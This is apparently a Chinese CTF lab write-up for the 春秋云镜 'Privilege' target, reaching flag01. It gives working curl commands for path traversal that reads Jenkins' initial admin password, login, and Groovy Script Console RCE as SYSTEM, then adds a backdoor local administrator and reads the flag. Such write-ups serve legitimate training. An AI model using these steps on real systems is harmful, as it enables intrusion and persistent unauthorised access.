# 春秋云镜 Privilege 靶机渗透Writeup

## 靶机信息

| 项目 | 内容 |
|------|------|
| 目标URL | http://39.100.181.54/ |
| 域 | xiaorang.lab |
| 入口机主机名 | XR-JENKINS |
| 入口机内网IP | 172.22.14.7 |

---

# flag01

## 一、信息收集

### 1.1 fscan 端口扫描

使用 fscan 对目标进行端口扫描和漏洞探测：

```bash
fscan -h 39.100.181.54
```

扫描结果：

```
39.100.181.54:3389 open     # RDP远程桌面
39.100.181.54:80 open       # Web服务
39.100.181.54:135 open      # Windows RPC
39.100.181.54:8080 open     # Jenkins服务
39.100.181.54:139 open      # NetBIOS
39.100.181.54:3306 open     # MySQL数据库端口
[*] NetInfo 
[*]39.100.181.54
   [->]XR-JENKINS
   [->]172.22.14.7
[*] WebTitle http://39.100.181.54      code:200 len:54689  title:XR SHOP
[*] WebTitle http://39.100.181.54:8080 code:403 len:548    title:None
[+] PocScan http://39.100.181.54/www.zip poc-yaml-backup-file
```

**关键发现：**
- 目标为Windows主机，主机名 **XR-JENKINS**，内网IP **172.22.14.7**
- 端口80运行Web应用（XR SHOP）
- **端口8080运行 Jenkins**（返回403）
- **检测到源码备份文件 `/www.zip` 泄露**（POC漏洞扫描命中）

### 1.2 下载源码

```bash
curl -s -o www.zip http://39.100.181.54/www.zip
```

解压后获得完整的Web源码，是一个WordPress站点。关键发现 `tools/content-log.php` 文件存在**任意文件读取漏洞**。

## 二、漏洞利用：任意文件读取（Path Traversal）

### 2.1 漏洞分析

`tools/content-log.php` 源码：

```php
<?php
$logfile = rawurldecode( $_GET['logfile'] );
// Make sure the file is exist.
if ( file_exists( $logfile ) ) {
  // Get the content and echo it.
  $text = file_get_contents( $logfile );
  echo( $text );
}
exit;
```

**：** 该脚本直接接收 `logfile` 参数并通过 `file_get_contents()` 读取文件内容，未对路径做任何过滤限制。攻击者可以通过 `../` 目录穿越读取服务器上的任意文件。

### 2.2 读取Jenkins初始管理员密码

Jenkins安装后会在 `C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword` 存储初始管理员密码。利用路径穿越读取该文件：

```bash
curl -s "http://39.100.181.54/tools/content-log.php?logfile=../../../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword"
```

**输出结果：**

```
510235cf43f14e83b88a9f144199655b
```

成功获取Jenkins初始管理员密码：`510235cf43f14e83b88a9f144199655b`

## 三、Jenkins后台登录

访问 `http://39.100.181.54:8080/login` 进入Jenkins登录页面：

- 用户名：`admin`
- 密码：`510235cf43f14e83b88a9f144199655b`

```bash
# 获取Session Cookie
curl -s -c /tmp/jenkins_jar.txt "http://39.100.181.54:8080/login"

# POST登录
curl -s -b /tmp/jenkins_jar.txt -c /tmp/jenkins_jar.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST "http://39.100.181.54:8080/j_spring_security_check" \
  -d "j_username=admin&j_password=510235cf43f14e83b88a9f144199655b&from=%2F&Submit=登录"
```

返回 **302 重定向**，登录成功。Jenkins版本为 **2.375.1**。

## 四、漏洞利用：Jenkins Script Console RCE

### 4.1 漏洞分析

**漏洞原理：** Jenkins内置的 Script Console（`/script`）允许管理员执行任意Groovy脚本。Groovy的 `String.execute()` 方法可以直接执行系统命令，导致远程代码执行（RCE）。攻击者获得Jenkins管理员权限后，即可通过Script Console获取服务器完全控制权。

### 4.2 获取CSRF Crumb

Jenkins的POST请求需要CSRF token：

```bash
curl -s -b /tmp/jenkins_jar.txt "http://39.100.181.54:8080/crumbIssuer/api/json"
# {"crumb":"bdc36c441417feb498114e6dcd1efe84fce00f6d8246002a2a132135445712ac","crumbRequestField":"Jenkins-Crumb"}
```

### 4.3 验证命令执行

```bash
curl -s -b /tmp/jenkins_jar.txt \
  -H "Jenkins-Crumb: bdc36c441417feb498114e6dcd1efe84fce00f6d8246002a2a132135445712ac" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST "http://39.100.181.54:8080/script" \
  --data-urlencode "script=println 'whoami'.execute().text"
```

**输出：`nt authority\system`** — Jenkins以SYSTEM权限运行。

### 4.4 创建管理员用户

通过Groovy命令执行添加用户并加入Administrators组：

```groovy
println "net user Z3r4y 0x401@admin /add".execute().text
println "net localgroup administrators Z3r4y /add".execute().text
```

执行结果：
```
命令成功完成。
命令成功完成。
```

用户 `Z3r4y` 已创建并加入 Administrators 组。

### 4.5 搜索并读取Flag

搜索flag文件：

```groovy
println 'cmd /c dir /s /b C:\flag*.txt C:\*flag*.txt 2>nul'.execute().text
```

发现flag文件位于：`C:\Users\Administrator\flag\flag01.txt`

读取flag：

```groovy
println 'cmd /c type C:\Users\Administrator\flag\flag01.txt'.execute().text
```

## 五、获取Flag

```
                                 _         _       _   _
                                | |       | |     | | (_)
  ___ ___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_ _  ___  _ __  ___
 / __/ _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| (_| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \___\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  __/ |
                 |___/

flag01: flag{75dc8198-df19-4db3-a0af-0973e50d3201}
```

## 🔗 Flag01 攻击链总结

```
信息收集（fscan）→ 源码泄露（www.zip）→ 任意文件读取（content-log.php）
→ Jenkins密码泄露 → Jenkins Script Console RCE（Groovy）
→ 创建管理员用户 → 读取flag01
```

| 步骤 | 漏洞/技术 | 关键资产 | 说明 |
|------|-----------|----------|------|
| 1 | 源码泄露 | www.zip | 备份文件可直接下载 |
| 2 | 任意文件读取 | content-log.php | logfile参数无过滤，路径穿越读取任意文件 |
| 3 | 凭据泄露 | initialAdminPassword | 读取到Jenkins初始管理员密码 |
| 4 | Jenkins RCE | Script Console | Groovy脚本执行系统命令，获得SYSTEM权限 |
| 5 | 权限维持 | 创建管理员用户 | net user添加用户，便于后续RDP登录 |

---

